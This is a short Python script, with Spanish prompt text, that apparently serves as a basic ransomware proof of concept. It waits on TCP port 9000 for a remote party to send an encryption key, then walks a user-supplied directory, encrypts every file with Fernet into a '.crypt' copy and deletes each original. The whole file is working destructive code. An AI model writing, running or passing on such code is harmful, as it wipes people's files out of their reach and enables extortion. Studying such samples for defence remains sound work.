import os, socket;
from cryptography.fernet import Fernet





def EncryptFile(filename, secret):

    try: 

        fernet = Fernet(secret)


        with open(filename, "rb") as file:
            data = file.read(); 


        EncryptedData = fernet.encrypt(data);


        with open(filename + ".crypt", 'wb') as file:
            file.write(EncryptedData);
        


        os.remove(filename);
        return True

    except Exception as e:
        print(f"Error! {e}");
        return False; 






def EncryptRoute(route, secret):

    for path, dirs, files in os.walk(route):
        for file in files:
            EncryptFile(os.path.join(path, file), secret);




try:

    serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM);


    serverAddress = ('', 9000);
    serverSocket.bind(serverAddress);
    serverSocket.listen();


    # Accept connections
    clientSocket, clientAddress = serverSocket.accept();
    key = clientSocket.recv(4096).decode("utf-8");


    route = input("Ingrese la ruta: ");


    EncryptRoute(route, key);

    



except Exception as e:
    print(f"Error {e}");

